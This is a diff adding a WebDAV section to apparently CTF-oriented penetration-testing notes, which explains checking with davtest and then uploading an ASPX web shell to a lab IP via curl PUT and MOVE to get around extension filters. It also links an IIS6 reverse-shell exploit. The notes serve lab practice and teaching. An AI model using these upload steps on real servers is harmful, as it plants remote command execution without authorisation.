@@ -128,6 +128,32 @@ A boatload. Check the link (also google for more):
 https://book.hacktricks.xyz/pentesting/pentesting-web/iis-internet-information-services
 
 
+#### WebDav
+
+> Web Distributed Authoring and Versioning (WebDAV) is an HTTP extension designed to allow people to create and modify web sites using HTTP. It was originally started in 1996, when this didn’t seem like a terrible idea. -- 0xdf
+
+You will mostly find this on old IIS versions if at all.
+
+Might allow you to upload files to the server directory (including asp, aspx, php).
+
+```bash
+davtest -url http://10.10.10.15
+```
+
+If you can upload files, but not with certain file extensions, then you might be able to use the MOVE feature:
+```bash
+cp /usr/share/webshells/aspx/cmdasp.aspx .
+curl -X PUT http://10.10.10.15/cmdasp.txt -d @cmdasp.aspx 
+curl -X MOVE -H 'Destination:http://10.10.10.15/cmdasp.aspx' http://10.10.10.15/cmdasp.txt
+```
+
+For IIS6 there is also a python remote exploit that gives a reverse shell directly:
+
+* https://gist.github.com/g0rx/693a89197e0b9d1464cab536fdc9f933
+
+Be wary though, this is disruptive to regular server functionality, so not a good idea in a shared CTF. Also might be a one-shot.
+
+
 ### Shellshock
 
 If you found a `/cgi-bin/` directory or if you know shell script files are getting interpreted and the output served via HTTP, then you should look for shellshock. 
